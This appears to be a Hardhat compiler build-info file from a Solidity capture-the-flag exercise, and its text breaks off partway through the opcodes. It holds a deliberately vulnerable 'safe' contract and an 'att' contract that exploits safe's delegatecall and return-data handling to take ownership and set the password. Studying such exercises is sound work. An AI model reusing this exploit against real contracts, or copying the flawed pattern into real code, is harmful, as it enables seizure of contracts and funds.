{
	"id": "575808d4c26fdd96cc38f29720ce780d",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.4.26",
	"solcLongVersion": "0.4.26+commit.4563c3fc",
	"input": {
		"language": "Solidity",
		"sources": {
			"shoot/3/delegatecall调用出错/1.sol": {
				"content": "pragma solidity ^0.4.23;\r\n// 1.成为owner.2.修改密码\r\ncontract att{\r\n    address public  owner;\r\n    uint256 public  password;\r\n    safe public sa;\r\n    bytes public constant SEL = abi.encodeWithSignature(\"setOwner()\");\r\n    bytes4 public set = this.gift.selector;\r\n    constructor(safe addr) public {\r\n        sa = addr;\r\n    }\r\n    function gift(address)public view{\r\n        bytes4 sel =0x40caae06;\r\n        bytes32 val = bytes32(0x2022);\r\n        assembly {\r\n            mstore(0, sel)\r\n            mstore(0x4, val)\r\n            revert(0, 0x24)\r\n        }\r\n    }\r\n    function attract() public {\r\n        sa.gift(address(this));\r\n    }\r\n\r\n}\r\ncontract safe{\r\n    address private owner;\r\n    uint256 private password ;\r\n    uint256 public score;\r\n    bytes4 internal constant SET = this.setPassword.selector;\r\n    function setOwner()public{\r\n        require(msg.sender ==address(this));\r\n        owner = tx.origin;\r\n    }\r\n\r\n    constructor()public{\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function complete()public payable{\r\n        require(address(this).balance>0);\r\n        if(msg.value>address(this).balance){\r\n            score=100;\r\n        }\r\n\r\n    }\r\n\r\n    function gift(address _target)public{\r\n        require(_target.delegatecall(abi.encodeWithSelector(this.gift.selector)) == false, \"unsafe execution\");\r\n        (bytes4 sel,uint256 val) = getReturns();\r\n\r\n        bool success = address(this).call(sel);\r\n        require(success,\"gift call error\");\r\n\r\n        success =address(this).call(abi.encodePacked(SET,val));\r\n        require(success,\"call failed\");\r\n    }\r\n\r\n    function setPassword(uint256 val)public{\r\n        require(msg.sender==address(this));\r\n        assembly { \r\n            sstore(1,val)\r\n        }\r\n    }\r\n\r\n    function getReturns()public pure returns(bytes4 sel, uint256 val){\r\n        assembly {\r\n            if iszero(eq(returndatasize, 0x24)) { revert(0, 0) }\r\n            let ptr := mload(0x40)\r\n            returndatacopy(ptr, 0, 0x24)\r\n            sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000)\r\n            val := mload(add(0x04, ptr))\r\n        }\r\n    }\r\n\r\n    function()external payable{}    \r\n\r\n    function isCompleted()public{\r\n        score=0;\r\n        if(msg.sender==owner){\r\n            score+=50;\r\n        }\r\n        if(password == 0x2022){\r\n            score+=50;\r\n        }\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"shoot/3/delegatecall调用出错/1.sol": {
				"att": {
					"abi": [
						{
							"constant": true,
							"inputs": [],
							"name": "password",
							"outputs": [
								{
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "attract",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "sa",
							"outputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "SEL",
							"outputs": [
								{
									"name": "",
									"type": "bytes"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "set",
							"outputs": [
								{
									"name": "",
									"type": "bytes4"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"name": "",
									"type": "address"
								}
							],
							"name": "gift",
							"outputs": [],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"name": "addr",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"shoot/3/delegatecall调用出错/1.sol\":59:649  contract att{\r... */\n  mstore(0x40, 0x80)\n    /* \"shoot/3/delegatecall调用出错/1.sol\":250:268  this.gift.selector */\n  mul(0x100000000000000000000000000000000000000000000000000000000, 0xcbfc4bce)\n    /* \"shoot/3/delegatecall调用出错/1.sol\":230:268  bytes4 public set = this.gift.selector */\n  0x2\n  exp(0x100, 0x14)\n  dup2\n  sload\n  dup2\n  0xffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0x100000000000000000000000000000000000000000000000000000000\n  swap1\n  div\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":275:333  constructor(safe addr) public {\r... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x0\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"shoot/3/delegatecall调用出错/1.sol\":275:333  constructor(safe addr) public {\r... */\n  pop\n  mload(0x40)\n  0x20\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  dup1\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":321:325  addr */\n  dup1\n    /* \"shoot/3/delegatecall调用出错/1.sol\":316:318  sa */\n  0x2\n  0x0\n    /* \"shoot/3/delegatecall调用出错/1.sol\":316:325  sa = addr */\n  0x100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":275:333  constructor(safe addr) public {\r... */\n  pop\n    /* \"shoot/3/delegatecall调用出错/1.sol\":59:649  contract att{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"shoot/3/delegatecall调用出错/1.sol\":59:649  contract att{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x224b610b\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x50f35753\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x77bd73db\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x7867fdea\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xb8e010de\n      eq\n      tag_7\n      jumpi\n      dup1\n      0xcbfc4bce\n      eq\n      tag_8\n      jumpi\n    tag_1:\n      0x0\n      dup1\n      revert\n        /* \"shoot/3/delegatecall调用出错/1.sol\":106:130  uint256 public  password */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_9\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_9:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":106:130  uint256 public  password */\n      pop\n      tag_10\n      jump(tag_11)\n    tag_10:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":577:644  function attract() public {\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":577:644  function attract() public {\r... */\n      pop\n      tag_13\n      jump(tag_14)\n    tag_13:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":137:151  safe public sa */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_15:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":137:151  safe public sa */\n      pop\n      tag_16\n      jump(tag_17)\n    tag_16:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":158:223  bytes public constant SEL = abi.encodeWithSignature(\"setOwner()\") */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_18:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":158:223  bytes public constant SEL = abi.encodeWithSignature(\"setOwner()\") */\n      pop\n      tag_19\n      jump(tag_20)\n    tag_19:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x0\n        /* \"--CODEGEN--\":8:108   */\n    tag_21:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_21)\n    tag_22:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":158:223  bytes public constant SEL = abi.encodeWithSignature(\"setOwner()\") */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_24\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x1\n      dup4\n      0x20\n      sub\n      0x100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_24:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":78:99  address public  owner */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_25\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_25:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":78:99  address public  owner */\n      pop\n      tag_26\n      jump(tag_27)\n    tag_26:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":230:268  bytes4 public set = this.gift.selector */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_28\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_28:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":230:268  bytes4 public set = this.gift.selector */\n      pop\n      tag_29\n      jump(tag_30)\n    tag_29:\n      mload(0x40)\n      dup1\n      dup3\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"shoot/3/delegatecall调用出错/1.sol\":339:571  function gift(address)public view{\r... */\n    tag_8:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_31\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_31:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":339:571  function gift(address)public view{\r... */\n      pop\n      tag_32\n      0x4\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      jump(tag_33)\n    tag_32:\n      stop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":106:130  uint256 public  password */\n    tag_11:\n      sload(0x1)\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":577:644  function attract() public {\r... */\n    tag_14:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":614:616  sa */\n      0x2\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"shoot/3/delegatecall调用出错/1.sol\":614:621  sa.gift */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xcbfc4bce\n        /* \"shoot/3/delegatecall调用出错/1.sol\":630:634  this */\n      address\n        /* \"shoot/3/delegatecall调用出错/1.sol\":614:636  sa.gift(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      mstore\n      0x4\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x0\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_35\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_35:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":614:636  sa.gift(address(this)) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_36\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_36:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":614:636  sa.gift(address(this)) */\n      pop\n      pop\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":577:644  function attract() public {\r... */\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":137:151  safe public sa */\n    tag_17:\n      0x2\n      0x0\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":158:223  bytes public constant SEL = abi.encodeWithSignature(\"setOwner()\") */\n    tag_20:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":186:223  abi.encodeWithSignature(\"setOwner()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":186:223  abi.encodeWithSignature(\"setOwner()\") */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x40caae0600000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":186:223  abi.encodeWithSignature(\"setOwner()\") */\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":158:223  bytes public constant SEL = abi.encodeWithSignature(\"setOwner()\") */\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":78:99  address public  owner */\n    tag_27:\n      0x0\n      dup1\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":230:268  bytes4 public set = this.gift.selector */\n    tag_30:\n      0x2\n      0x14\n      swap1\n      sload\n      swap1\n      0x100\n      exp\n      swap1\n      div\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      dup2\n      jump\t// out\n        /* \"shoot/3/delegatecall调用出错/1.sol\":339:571  function gift(address)public view{\r... */\n    tag_33:\n        /* \"shoot/3/delegatecall调用出错/1.sol\":383:393  bytes4 sel */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":416:427  bytes32 val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":395:405  0x40caae06 */\n      0x40caae06\n        /* \"shoot/3/delegatecall调用出错/1.sol\":383:405  bytes4 sel =0x40caae06 */\n      0x100000000000000000000000000000000000000000000000000000000\n      mul\n      swap2\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":438:444  0x2022 */\n      0x2022\n        /* \"shoot/3/delegatecall调用出错/1.sol\":430:445  bytes32(0x2022) */\n      0x1\n      mul\n        /* \"shoot/3/delegatecall调用出错/1.sol\":416:445  bytes32 val = bytes32(0x2022) */\n      swap1\n      pop\n        /* \"shoot/3/delegatecall调用出错/1.sol\":490:493  sel */\n      dup2\n        /* \"shoot/3/delegatecall调用出错/1.sol\":487:488  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":480:494  mstore(0, sel) */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":520:523  val */\n      dup1\n        /* \"shoot/3/delegatecall调用出错/1.sol\":515:518  0x4 */\n      0x4\n        /* \"shoot/3/delegatecall调用出错/1.sol\":508:524  mstore(0x4, val) */\n      mstore\n        /* \"shoot/3/delegatecall调用出错/1.sol\":548:552  0x24 */\n      0x24\n        /* \"shoot/3/delegatecall调用出错/1.sol\":545:546  0 */\n      0x0\n        /* \"shoot/3/delegatecall调用出错/1.sol\":538:553  revert(0, 0x24) */\n      revert\n\n    auxdata: 0xa165627a7a7230582035aabf9b2922f8c931f68b9a4e411b6a8f3abfad87c4644d256f350a1cb97b860029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405263cbfc4bce7c010000000000000000000000000000000000000000000000000000000002600260146101000a81548163ffffffff02191690837c01000000000000000000000000000000000000000000000000000000009004021790555034801561006e57600080fd5b506040516020806105de8339810180604052810190808051906020019092919050505080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506104fc806100e26000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063224b610b1461008857806350f35753146100b357806377bd73db146100ca5780637867fdea146101215780638da5cb5b146101b1578063b8e010de14610208578063cbfc4bce14610271575b600080fd5b34801561009457600080fd5b5061009d6102b4565b6040518082815260200191505060405180910390f35b3480156100bf57600080fd5b506100c86102ba565b005b3480156100d657600080fd5b506100df610391565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561012d57600080fd5b506101366103b7565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561017657808201518184015260208101905061015b565b50505050905090810190601f1680156101a35780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156101bd57600080fd5b506101c661043d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561021457600080fd5b5061021d610462565b60405180827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916815260200191505060405180910390f35b34801561027d57600080fd5b506102b2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610491565b005b60015481565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cbfc4bce306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561037757600080fd5b505af115801561038b573d6000803e3d6000fd5b50505050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6040516024016040516020818303038152906040527f40caae06000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505081565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260149054906101000a90047c01000000000000000000000000000000000000000000000000000000000281565b6000806340caae067c01000000000000000000000000000000000000000000000000000000000291506120226001029050816000528060045260246000fd00a165627a7a7230582035aabf9b2922f8c931f68b9a4e411b6a8f3abfad87c4644d256f350a1cb97b860029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH4 0xCBFC4BCE PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL PUSH1 0x2 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH4 0xFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP1 PUSH2 0x5DE DUP4 CODECOPY DUP2 ADD DUP1 PUSH1 0x40 MSTORE DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x4FC DUP1 PUSH2 0xE2 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x83 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x224B610B EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0x50F35753 EQ PUSH2 0xB3 JUMPI DUP1 PUSH4 0x77BD73DB EQ PUSH2 0xCA JUMPI DUP1 PUSH4 0x7867FDEA EQ PUSH2 0x121 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1B1 JUMPI DUP1 PUSH4 0xB8E010DE EQ PUSH2 0x208 JUMPI DUP1 PUSH4 0xCBFC4BCE EQ PUSH2 0x271 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x94 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9D PUSH2 0x2B4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC8 PUSH2 0x2BA JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xD6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xDF PUSH2 0x391 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x12D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x136 PUSH2 0x3B7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD 